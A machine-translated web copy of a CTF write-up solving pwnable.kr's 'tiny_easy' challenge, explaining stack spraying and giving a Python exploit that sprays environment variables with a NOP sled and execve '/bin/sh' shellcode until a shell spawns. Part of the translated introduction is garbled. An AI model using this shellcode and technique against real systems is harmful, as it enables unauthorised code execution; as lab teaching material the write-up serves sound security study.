<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë®üèΩ‚Äçüöí üßõüèΩ üëàüèº Problem solving with pwnable.kr 27 - tiny_easy. Understanding Stack Spraying üë¥üèø üìî üèº</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In this article, we will solve the 27th task from the site pwnable.kr and we will understand what Stack spraying is.
 
 Organizational Information , -...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Problem solving with pwnable.kr 27 - tiny_easy. Understanding Stack Spraying</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/487620/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/al/py/ef/alpyefagnx81cc2xc1ncjqs8lus.png" alt="image"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In this article, we will solve the 27th task from the site </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pwnable.kr</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> and we will understand what Stack spraying is.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Organizational Information</font></font></b><div class="spoiler_text">  ,    -           ,        :<br>
<br>
<ul>
<li>PWN;</li>
<li> (Crypto);</li>
<li>c  (Network);</li>
<li> (Reverse Engineering);</li>
<li> (Stegano);</li>
<li>   WEB-.</li>
</ul><br>
         ,    ,        ,     .<br>
<a name="habracut"></a><br>
      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=">    </a>.<br>
<br>
      .          ,  -      ,      .<br>
</div></div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Solution to the tiny_easy job</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Click on the tyni_easy signature icon. We are given the address and port for connecting via ssh. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/q-/yl/dz/q-yldzq42gi-ljkee84njvphs04.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
We are connected via SSH and we see the flag and the program already without the source code. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/bj/er/jh/bjerjh8h3vd73sozoxr3wxlljsa.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
As a result of checking the file, we find out that it has no protection. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/q1/yg/wz/q1ygwzjjb352ef6petoktqa9r-c.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Download the program to the disassembler. The file is very small and follows just a few instructions. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/nf/7l/xs/nf7lxsmitan7fwcykpz9z8bzqlu.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
At the very beginning, the program extracts the value from the stack into the EAX register, after which it extracts another one into EDX and transfers control to this address. But what is located on the stack at the very beginning of the program? On the stack at this moment I have the very same argc (the number of program arguments), argv (a pointer to an array of program arguments) and envp (a pointer to an array of environment variables).</font></font><br>
<br>
<img src="https://habrastorage.org/webt/6q/xq/5f/6qxq5ff-fdfnlbchy7td30dybyo.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Thus, in EDX, the address will be placed on the first element of the array of program arguments, that is, on the full path to the executable file! Therefore, trying to execute it as a code, the application should crash. If you check, then it turns out. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/3r/_z/kx/3r_zkxdcvrq8pv4yilpp6ijjpiu.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Stack spraying is an attack that uses errors in the application‚Äôs memory, which forces the application to allocate memory for a large number of objects containing malicious code. This increases the likelihood of an exploit's success, which transfers the execution flow to some position inside. It is important to understand that without an exploit that allows you to change the flow of execution, this attack will not do any harm. The attack is based on predictability of the address in the process address space.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
When creating a process in the operating system, an address space is allocated for its needs, in which user data, executable code and some system information are located, which depends on the specific operating system. So, in the stack segment, variables with an automatic placement class are stored, as well as information that is stored every time the function is called, for example, static variables and the return address when the function is called. In the case of stack spraying, we operate on environment variables in which the exploit is located. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
This way we can arrange the shellcode in the environment variables on the stack. But we will do a lot of nop operations in front of him, since we are unlikely to be able to get to the right address exactly.</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> subprocess<font></font>
<font></font>
payload =  <span class="hljs-string">"\x90"</span>*<span class="hljs-number">4096</span> + <span class="hljs-string">"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"</span></code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Since the program starts from the address 0xff ******, we take the random address for the stack from this environment, for example, 0xffbbbbbbb.</font></font><br>
<pre><code class="python hljs">addr = <span class="hljs-string">"\xb0\xaf\xb5\xff"</span></code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Now we‚Äôll make some environment variables with our shellcode, so that the probability of getting to it is higher.</font></font><br>
<br>
<pre><code class="python hljs">envs = {}
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>):  <font></font>
    envs[<span class="hljs-string">"env"</span>+str(i)] = payload</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And several times we run the program with our parameters.</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<font></font>
	p = subprocess.Popen([addr], executable=<span class="hljs-string">"/home/tiny_easy/tiny_easy"</span>, env=envs)<font></font>
	p.wait()</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
After running the full code, we get a shell. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/mf/pz/i7/mfpzi7o2iplbidzmwy9aqttkxmq.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Further more ... You can join us on </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Let's put together a community in which there will be people who are versed in many areas of IT, then we can always help each other on any IT and information security issues.</font></font></div>
      
    </div><p class="reference-to-source js-reference-to-source">Source: https://habr.com/ru/post/undefined/</p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../en487604/index.html">Embed programmer‚Äôs brief notes: section duplication in the microcontroller‚Äôs memory</a></li>
<li><a href="../en487606/index.html">Visualization of lines of tension and movements of electrostatic charges, simulation of planetary motion of the solar system</a></li>
<li><a href="../en487610/index.html">RealWorld: aiohttp, Tortoise ORM</a></li>
<li><a href="../en487612/index.html">Easily add, delete and rename files and goals in CMake projects</a></li>
<li><a href="../en487616/index.html">Creating a custom item using an example table in C # for Windows Form</a></li>
<li><a href="../en487622/index.html">–ê–Ω—Ç–∏–ø–∞—Ç—Ç–µ—Ä–Ω—ã —Ä–∞–±–æ—Ç—ã —Å –±–∞–∑–∞–º–∏ –¥–∞–Ω–Ω—ã—Ö</a></li>
<li><a href="../en487626/index.html">How parking sensors work and how to trick him</a></li>
<li><a href="../en487628/index.html">Diagnosis of aging based on 9 hallmarks of aging signs</a></li>
<li><a href="../en487630/index.html">The Simplest Algorithm for Creating a Field Puzzle (Part 1)</a></li>
<li><a href="../en487632/index.html">‚ÄúColleagues, breathe more quietly‚Äù: why office noise drives us crazy - we discuss research</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>